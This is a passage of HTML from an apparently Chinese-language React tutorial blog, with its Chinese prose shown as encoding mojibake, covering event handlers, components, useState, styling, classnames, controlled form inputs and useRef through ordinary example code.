style="zoom:35%;"><p>æ³¨æ„ï¼šä¸èƒ½ç›´æ¥å†™å‡½æ•°è°ƒç”¨ï¼Œè¿™é‡Œäº‹ä»¶ç»‘å®šéœ€è¦ä¸€ä¸ªå‡½æ•°å¼•ç”¨ã€‚</p><h2 id="4-4-åŒæ—¶ä¼ é€’äº‹ä»¶å¯¹è±¡å’Œè‡ªå®šä¹‰å‚æ•°"><a href="#4-4-åŒæ—¶ä¼ é€’äº‹ä»¶å¯¹è±¡å’Œè‡ªå®šä¹‰å‚æ•°" class="headerlink" title="4.4 åŒæ—¶ä¼ é€’äº‹ä»¶å¯¹è±¡å’Œè‡ªå®šä¹‰å‚æ•°"></a>4.4 åŒæ—¶ä¼ é€’äº‹ä»¶å¯¹è±¡å’Œè‡ªå®šä¹‰å‚æ•°</h2><p>è¯­æ³•ï¼šåœ¨äº‹ä»¶ç»‘å®šçš„ä½ç½®ä¼ é€’äº‹ä»¶å®å‚eå’Œè‡ªå®šä¹‰å‚æ•°ï¼ŒclickHandlerä¸­å£°æ˜å½¢å‚ï¼Œæ³¨æ„é¡ºåºå¯¹åº”ã€‚</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span>e</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'buttonæŒ‰é’®ç‚¹å‡»äº†'</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span>e<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token function">clickHandler</span><span class="token punctuation">(</span><span class="token string">'jack'</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">click me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="äº”ã€Reactç»„ä»¶"><a href="#äº”ã€Reactç»„ä»¶" class="headerlink" title="äº”ã€Reactç»„ä»¶"></a>äº”ã€Reactç»„ä»¶</h1><h2 id="5-1-ç»„ä»¶æ˜¯ä»€ä¹ˆ"><a href="#5-1-ç»„ä»¶æ˜¯ä»€ä¹ˆ" class="headerlink" title="5.1 ç»„ä»¶æ˜¯ä»€ä¹ˆ"></a>5.1 ç»„ä»¶æ˜¯ä»€ä¹ˆ</h2><p>æ¦‚å¿µï¼šä¸€ä¸ªç»„ä»¶å°±æ˜¯ä¸€ä¸ªç”¨æˆ·ç•Œé¢çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå¯ä»¥æœ‰è‡ªå·±çš„é€»è¾‘å’Œå¤–è§‚ï¼Œç»„ä»¶ä¹‹é—´å¯ä»¥äº’ç›¸åµŒå¥—ï¼Œä¹Ÿå¯ä»¥å¤ç”¨å¤šæ¬¡ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.13.36.png" style="zoom:40%;"><p>ç»„ä»¶åŒ–å¼€å‘å¯ä»¥è®©å¼€å‘è€…åƒæ­ç§¯æœ¨ä¸€æ ·æ„å»ºä¸€ä¸ªå®Œæ•´çš„åºå¤§çš„åº”ç”¨ã€‚</p><h2 id="5-2-ç»„ä»¶åŸºç¡€ä½¿ç”¨"><a href="#5-2-ç»„ä»¶åŸºç¡€ä½¿ç”¨" class="headerlink" title="5.2 ç»„ä»¶åŸºç¡€ä½¿ç”¨"></a>5.2 ç»„ä»¶åŸºç¡€ä½¿ç”¨</h2><p>åœ¨Reactä¸­ï¼Œä¸€ä¸ªç»„ä»¶å°±æ˜¯<strong>é¦–å­—æ¯å¤§å†™çš„å‡½æ•°</strong>ï¼Œå†…éƒ¨å­˜æ”¾äº†ç»„ä»¶çš„é€»è¾‘å’Œè§†å›¾UI, æ¸²æŸ“ç»„ä»¶åªéœ€è¦æŠŠç»„ä»¶å½“æˆæ ‡ç­¾ä¹¦å†™å³å¯ã€‚</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 1. å®šä¹‰ç»„ä»¶</span><span class="token keyword">function</span> <span class="token function">Button</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// å†…éƒ¨é€»è¾‘</span>  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">click me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token comment">// å¯ä»¥ç”¨ç®­å¤´å‡½æ•°çš„æ–¹æ³•</span><span class="token comment">// const MyButton2 = ()=&gt;{</span><span class="token comment">//   return &lt;button&gt;Click Me 2&lt;/button&gt;  </span><span class="token comment">// }</span><span class="token comment">// 2. ä½¿ç”¨ç»„ä»¶</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* è‡ªé—­å’Œ */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Button</span></span><span class="token punctuation">/&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* æˆå¯¹æ ‡ç­¾ */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Button</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Button</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="å…­ã€useState"><a href="#å…­ã€useState" class="headerlink" title="å…­ã€useState"></a>å…­ã€useState</h1><h2 id="6-1-åŸºç¡€ä½¿ç”¨"><a href="#6-1-åŸºç¡€ä½¿ç”¨" class="headerlink" title="6.1 åŸºç¡€ä½¿ç”¨"></a>6.1 åŸºç¡€ä½¿ç”¨</h2><p>useState æ˜¯ä¸€ä¸ª React Hookï¼ˆå‡½æ•°ï¼‰ï¼Œå®ƒå…è®¸æˆ‘ä»¬å‘ç»„ä»¶æ·»åŠ ä¸€ä¸ª<code>çŠ¶æ€å˜é‡</code>, ä»è€Œæ§åˆ¶å½±å“ç»„ä»¶çš„æ¸²æŸ“ç»“æœã€‚</p><p>å’Œæ™®é€šJSå˜é‡ä¸åŒçš„æ˜¯ï¼ŒçŠ¶æ€å˜é‡ä¸€æ—¦å‘ç”Ÿå˜åŒ–ç»„ä»¶çš„è§†å›¾UIä¹Ÿä¼šè·Ÿç€å˜åŒ–ï¼ˆæ•°æ®é©±åŠ¨è§†å›¾ï¼‰ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.29.45.png" style="zoom:20%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// useStateå®ç°ä¸€ä¸ªè®¡æ•°å™¨æŒ‰é’®</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 1. è°ƒç”¨useStateæ·»åŠ ä¸€ä¸ªçŠ¶æ€å˜é‡</span>  <span class="token comment">// count çŠ¶æ€å˜é‡</span>  <span class="token comment">// setCount ä¿®æ”¹çŠ¶æ€å˜é‡çš„æ–¹æ³•</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">// 2. ç‚¹å‡»äº‹ä»¶å›è°ƒ</span>  <span class="token keyword">const</span> <span class="token function-variable function">handleClick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// ä½œç”¨: </span>    <span class="token comment">// 1. ç”¨ä¼ å…¥çš„æ–°å€¼ä¿®æ”¹count</span>    <span class="token comment">// 2. é‡æ–°ä½¿ç”¨æ–°çš„countæ¸²æŸ“UI</span>    <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>handleClick<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-2-çŠ¶æ€çš„ä¿®æ”¹è§„åˆ™"><a href="#6-2-çŠ¶æ€çš„ä¿®æ”¹è§„åˆ™" class="headerlink" title="6.2 çŠ¶æ€çš„ä¿®æ”¹è§„åˆ™"></a>6.2 çŠ¶æ€çš„ä¿®æ”¹è§„åˆ™</h2><p>åœ¨Reactä¸­çŠ¶æ€è¢«è®¤ä¸ºæ˜¯åªè¯»çš„ï¼Œæˆ‘ä»¬åº”è¯¥å§‹ç»ˆ<code>æ›¿æ¢å®ƒè€Œä¸æ˜¯ä¿®æ”¹å®ƒ</code>, ç›´æ¥ä¿®æ”¹çŠ¶æ€ä¸èƒ½å¼•å‘è§†å›¾æ›´æ–°ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.39.41.png" style="zoom:50%;"><h2 id="6-3-ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€"><a href="#6-3-ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€" class="headerlink" title="6.3 ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€"></a>6.3 ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€</h2><p>å¯¹äºå¯¹è±¡ç±»å‹çš„çŠ¶æ€å˜é‡ï¼Œåº”è¯¥å§‹ç»ˆç»™setæ–¹æ³•ä¸€ä¸ª<code>å…¨æ–°çš„å¯¹è±¡</code> æ¥è¿›è¡Œä¿®æ”¹ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.50.21.png" style="zoom:50%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">handleClick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// ç›´æ¥ä¿®æ”¹ æ— æ³•å¼•å‘è§†å›¾æ›´æ–°</span>    <span class="token comment">// count++</span>    <span class="token comment">// console.log(count)</span>    <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment">// ä¿®æ”¹å¯¹è±¡çŠ¶æ€</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>form<span class="token punctuation">,</span> setForm<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'jack'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">changeForm</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// é”™è¯¯å†™æ³•ï¼šç›´æ¥ä¿®æ”¹</span>    <span class="token comment">// form.name = 'john'</span>    <span class="token comment">// æ­£ç¡®å†™æ³•ï¼šsetFrom ä¼ å…¥ä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡</span>    <span class="token function">setForm</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      <span class="token operator">...</span>form<span class="token punctuation">,</span>      <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'john'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>handleClick<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>changeForm<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">ä¿®æ”¹form</span><span class="token punctuation">{</span>form<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ä¸ƒã€æ ·å¼æ§åˆ¶"><a href="#ä¸ƒã€æ ·å¼æ§åˆ¶" class="headerlink" title="ä¸ƒã€æ ·å¼æ§åˆ¶"></a>ä¸ƒã€æ ·å¼æ§åˆ¶</h1><h2 id="7-1-è¡Œå†…æ ·å¼ï¼ˆä¸æ¨èï¼‰"><a href="#7-1-è¡Œå†…æ ·å¼ï¼ˆä¸æ¨èï¼‰" class="headerlink" title="7.1 è¡Œå†…æ ·å¼ï¼ˆä¸æ¨èï¼‰"></a>7.1 è¡Œå†…æ ·å¼ï¼ˆä¸æ¨èï¼‰</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2018.06.47.png" style="zoom:50%;"><h2 id="7-2-ç±»åæ§åˆ¶æ ·å¼ï¼ˆå•ç‹¬cssæ–‡ä»¶ï¼‰"><a href="#7-2-ç±»åæ§åˆ¶æ ·å¼ï¼ˆå•ç‹¬cssæ–‡ä»¶ï¼‰" class="headerlink" title="7.2 ç±»åæ§åˆ¶æ ·å¼ï¼ˆå•ç‹¬cssæ–‡ä»¶ï¼‰"></a>7.2 ç±»åæ§åˆ¶æ ·å¼ï¼ˆå•ç‹¬cssæ–‡ä»¶ï¼‰</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2018.07.23.png" style="zoom:50%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// å¯¼å…¥æ ·å¼</span><span class="token keyword">import</span> <span class="token string">'./index.css'</span><span class="token keyword">const</span> style <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'red'</span><span class="token punctuation">,</span>  <span class="token literal-property property">fontSize</span><span class="token operator">:</span> <span class="token string">'50px'</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* è¡Œå†…æ ·å¼æ§åˆ¶ */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>style<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* é€šè¿‡classç±»åæ§åˆ¶ */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>foo<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is class foo</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.foo</span> <span class="token punctuation">{</span>  <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="å…«ã€classnamesåŠ¨æ€æ§åˆ¶ç±»å"><a href="#å…«ã€classnamesåŠ¨æ€æ§åˆ¶ç±»å" class="headerlink" title="å…«ã€classnamesåŠ¨æ€æ§åˆ¶ç±»å"></a>å…«ã€classnamesåŠ¨æ€æ§åˆ¶ç±»å</h1><h2 id="8-1-å®‰è£…classnamesåº“"><a href="#8-1-å®‰è£…classnamesåº“" class="headerlink" title="8.1 å®‰è£…classnamesåº“"></a>8.1 å®‰è£…classnamesåº“</h2><p>classnamesæ˜¯ä¸€ä¸ªç®€å•çš„JSåº“ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„é€šè¿‡æ¡ä»¶åŠ¨æ€æ§åˆ¶classç±»åçš„æ˜¾ç¤ºã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> classnames<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-2-ä½¿ç”¨"><a href="#8-2-ä½¿ç”¨" class="headerlink" title="8.2 ä½¿ç”¨"></a>8.2 ä½¿ç”¨</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2016.03.39.png" alt="åŸå§‹çš„æ¨¡ç‰ˆå­—ç¬¦ä¸²æ–¹å¼" style="zoom:50%;"><p>é—®é¢˜ï¼šå­—ç¬¦ä¸²çš„æ‹¼æ¥æ–¹å¼ä¸å¤Ÿç›´è§‚ï¼Œä¹Ÿå®¹æ˜“å‡ºé”™ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2016.04.36.png" alt="è°ƒç”¨classNames()å‡½æ•°" style="zoom:67%;"><h1 id="ä¹ã€å—æ§è¡¨å•ç»‘å®š"><a href="#ä¹ã€å—æ§è¡¨å•ç»‘å®š" class="headerlink" title="ä¹ã€å—æ§è¡¨å•ç»‘å®š"></a>ä¹ã€å—æ§è¡¨å•ç»‘å®š</h1><p>æ¦‚å¿µï¼šä½¿ç”¨Reactç»„ä»¶çš„çŠ¶æ€ï¼ˆuseStateï¼‰æ§åˆ¶è¡¨å•çš„çŠ¶æ€ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2017.11.25.png" style="zoom:50%;"><p>1ï¼‰å‡†å¤‡ä¸€ä¸ªReactçŠ¶æ€å€¼</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span> setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2ï¼‰é€šè¿‡valueå±æ€§ç»‘å®šçŠ¶æ€ï¼Œé€šè¿‡onChangeå±æ€§ç»‘å®šçŠ¶æ€åŒæ­¥çš„å‡½æ•°</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2017.13.58.png" style="zoom:50%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// å—æ§ç»‘å®šè¡¨å•</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token comment">// 1. å£°æ˜ä¸€ä¸ªreactçŠ¶æ€ - useState</span><span class="token comment">// 2. æ ¸å¿ƒç»‘å®šæµç¨‹</span><span class="token comment">// 1. é€šè¿‡valueå±æ€§ç»‘å®šreactçŠ¶æ€</span><span class="token comment">// 2. ç»‘å®šonChangeäº‹ä»¶ é€šè¿‡äº‹ä»¶å‚æ•°eæ‹¿åˆ°è¾“å…¥æ¡†æœ€æ–°çš„å€¼ åå‘ä¿®æ”¹åˆ°reactçŠ¶æ€èº«ä¸Š</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span> setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>        <span class="token attr-name">value</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>value<span class="token punctuation">}</span></span>        <span class="token attr-name">onChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setValue</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span></span>        <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="åã€Reactè·å–DOMå…ƒç´ "><a href="#åã€Reactè·å–DOMå…ƒç´ " class="headerlink" title="åã€Reactè·å–DOMå…ƒç´ "></a>åã€Reactè·å–DOMå…ƒç´ </h1><p>åœ¨ React ç»„ä»¶ä¸­è·å–/æ“ä½œ DOMï¼Œéœ€è¦ä½¿ç”¨ useRef React Hooké’©å­å‡½æ•°ï¼Œåˆ†ä¸ºä¸¤æ­¥ï¼š</p><ol><li>ä½¿ç”¨useRefåˆ›å»º ref å¯¹è±¡ï¼Œå¹¶ä¸ JSX ç»‘å®š</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2018.12.21.png" style="zoom:40%;"><ol start="2"><li>åœ¨DOMå¯ç”¨æ—¶ï¼Œé€šè¿‡ inputRef.current æ‹¿åˆ° DOM å¯¹è±¡</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2018.12.52.png" style="zoom:40%;"><h1 id="åä¸€ã€ç»„ä»¶é€šä¿¡"><a href="#åä¸€ã€ç»„ä»¶é€šä¿¡" class="headerlink" title="åä¸€ã€ç»„ä»¶é€šä¿¡"></a>åä¸€ã€ç»„ä»¶é€šä¿¡</h1><h2 id="11-1-ç»„ä»¶é€šä¿¡çš„æ¦‚å¿µ"><a href="#11-1-ç»„ä»¶é€šä¿¡çš„æ¦‚å¿µ" class="headerlink" title="11.1 ç»„ä»¶é€šä¿¡çš„æ¦‚å¿µ"></a>11.1 ç»„ä»¶é€šä¿¡çš„æ¦‚å¿µ</h2><p>æ¦‚å¿µï¼šç»„ä»¶é€šä¿¡å°±æ˜¯ç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ é€’ï¼Œæ ¹æ®ç»„ä»¶åµŒå¥—å…³ç³»çš„ä¸åŒï¼Œæœ‰ä¸åŒçš„é€šä¿¡æ–¹æ³•ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2017.41.28.png" alt="æˆªå±2024-12-17 17.41.28" style="zoom:50%;"><h2 id="11-2-çˆ¶å­ç»„ä»¶é€šä¿¡"><a href="#11-2-çˆ¶å­ç»„ä»¶é€šä¿¡" class="headerlink" title="11.2 çˆ¶å­ç»„ä»¶é€šä¿¡"></a>11.2 çˆ¶å­ç»„ä»¶é€šä¿¡</h2><h3 id="11-2-1-çˆ¶ä¼ å­"><a href="#11-2-1-çˆ¶ä¼ å­" class="headerlink" title="11.2.1 çˆ¶ä¼ 